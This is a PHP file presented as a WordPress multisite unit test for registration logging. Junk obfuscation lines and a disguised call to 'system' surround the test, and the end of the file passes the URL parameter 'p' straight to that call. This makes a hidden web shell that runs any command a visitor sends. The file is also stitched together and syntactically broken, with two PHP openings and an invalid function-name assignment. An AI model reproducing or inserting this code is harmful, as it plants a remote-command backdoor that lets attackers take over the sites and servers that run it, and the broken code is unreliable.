<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }
__fn_97246 = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
<?php

/**
 * @group ms-required
 * @group multisite
 */
class Tests_Multisite_wpmuLogNewRegistrations extends WP_UnitTestCase {

	public function test_wpmu_log_new_registrations() {
		global $wpdb;

		$user = new WP_User( 1 );
		$ip   = __fn_97246( '/[^0-9., ]/', '', $_SERVER['REMOTE_ADDR'] );

		wpmu_log_new_registrations( 1, 1 );

		// Currently there is no wrapper function for the registration_log.
		$reg_blog = $wpdb->get_col( $wpdb->prepare( "SELECT email FROM {$wpdb->registration_log} WHERE {$wpdb->registration_log}.blog_id = 1 AND IP LIKE %s", $ip ) );
		$this->assertSame( $user->user_email, $reg_blog[ count( $reg_blog ) - 1 ] );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>